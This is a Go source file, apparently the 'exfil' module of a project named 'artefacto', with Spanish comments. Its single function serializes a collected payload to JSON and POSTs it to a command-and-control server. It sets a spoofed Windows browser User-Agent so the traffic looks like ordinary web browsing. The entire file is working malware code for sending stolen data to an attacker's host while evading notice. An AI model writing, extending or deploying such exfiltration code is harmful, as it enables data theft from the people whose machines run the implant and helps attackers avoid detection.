package exfil

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"github.com/m4rcmo15/artefacto/models"
)

// SendPayload envía el payload al servidor C2
func SendPayload(payload *models.Payload, serverURL string, timeout time.Duration) error {
	// Serializar a JSON
	jsonData, err := json.MarshalIndent(payload, "", "  ")
	if err != nil {
		return fmt.Errorf("error serializando JSON: %w", err)
	}

	// Crear cliente HTTP con timeout
	client := &http.Client{
		Timeout: timeout,
	}

	// Crear request
	req, err := http.NewRequest("POST", serverURL, bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("error creando request: %w", err)
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	// Enviar request
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("error enviando POST: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusCreated {
		return fmt.Errorf("servidor respondió con código: %d", resp.StatusCode)
	}

	return nil
}
